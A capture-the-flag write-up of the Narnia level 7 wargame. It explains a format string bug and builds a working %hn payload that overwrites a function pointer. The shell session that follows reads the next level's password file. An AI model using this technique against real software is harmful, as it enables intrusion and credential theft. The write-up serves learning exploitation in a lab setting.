Briefly looking through the functions used in the above code, we can see that the snprintf() function is used again without format parameters. Which means this is another format string vulnerability challenge. After identifying what kind of challenge this would be, I started reading the entire code as a whole.

We can see in the main() an IF statement is used to the user they have to give 1 or more arguements to the binary, if the user doesn’t the application will close. If the user passes 1 or more arguements to the binary, the first arguement entered is passed to the vuln() function.

The vuln() creates a buffer of 128 bytes called buffer, also declares a function called “ptrf” which performs wildcard subsituation two previously declared functions (goodfunction()/hackedfunction()). Next in the vuln(), the buffer is filled with 0’s. Afterwards two printf() functions are used to print the location in memory of two functions (goodfunction()/hackedfunction()). Next the ptrf is set to equal goodfunction and then the current memory location of the ptrf() is printed to the screen. A message is printed to the screen and the program waits 2 seconds and then sets goodfunction() to equal ptrf again. The snprintf() is used to print the contents of the buffer. And finally the program returns to where ptrf() is pointing to, which at the current time would be goodfunction().

```
(gdb) r A
Starting program: /games/narnia/narnia7 A
goodfunction() = 0x804866f
hackedfunction() = 0x8048695
 
before : ptrf() = 0x804866f (0xffffd67c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
[Inferior 1 (process 4592) exited normally]
```

Obviously this challenge is overwrite the goodfunction() memory address in ptrf() with the memory location relevant to the hackedfunction(). This challenge actually gives us all the information we need to complete this challenge without us having to go looking for it. The information we need is the following:

The memory address of the ptrf() function that calls the other functions we have to overwrite (0xffffd67c).
The memory address of the function going to be called by the ptrf() (0x804866f).
And the memory address of the function we need to overwrite to (0x8048695).
This challenge is similar to the level 9 IO Smash The Stack challenge, in which the goal was to overwrite a memory address with a memory address which would lead to the shellcode for the exploit. But unlike that challenge, we can’t use the DTOR method. This left me scratching my head, but then I decided to have a look at the books in my library and pulled out two books which covered format string vulnerabilities.

In the book, Gray Hat Hacking, The Ethical Hacker’s Handbook. 3rd Ed., in chapter 12 there is a section for “Writing to Arbitary Memory” in format string vulnerabilities. Reading this section, it states that the easiest way to write 4 bytes into memory is to split it into two equal parts, and use the parameters #$ and %hn into the right place in memory. This means I need to split the hackedfunction() memory address into the two haves.

Two high-order bytes (HOB): 0x0804
Two low-order bytes (LOB): 0x8695

This book provides a table (table 12-2) which contains the formula to construct the string to overwrite the memory address. Based on the calculations done using the table I was able to proceduce the following string. If you don’t have access to the book, I’m sure you would be able to find a copy to reference. But if you don’t, I’ve included part of the reference table which I used for this challenge.

```
When HOB < LOB
[addr + 2][addr]
%.[HOB - 8]x
%[offset]$hn
%.[LOB - HOB]x
%[offset + 1]$hn
```

The below section is the results from the calculation.

```
[addr + 2][addr]    =       \x7e\xd6\xff\xff\x7c\xd6\xff\xff
%.[HOB - 8]x        =       0x0804 - 8 = 7FC (2044) = %.2044x
%[offset]$hn        =       %6\$hn
%.[LOB - HOB]x      =       0x8695 - 0804 = 7E91 (32401) = %.32401x
%[offset + 1]$hn    =       %7\$hn
```
Thus the final string sent to the challenge would be.

```
$(python -c'print("\x7e\xd6\xff\xff\x7c\xd6\xff\xff")')%.2044x%6\$hn%.32401x%7\$hn
```
```
narnia7@melinda:/narnia$ ./narnia7 $(python -c'print("\x7e\xd6\xff\xff\x7c\xd6\xff\xff")')%.2044x%6\$hn%.32401x%7\$hn
goodfunction() = 0x804866f
hackedfunction() = 0x8048695
 
before : ptrf() = 0x804866f (0xffffd67c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
```
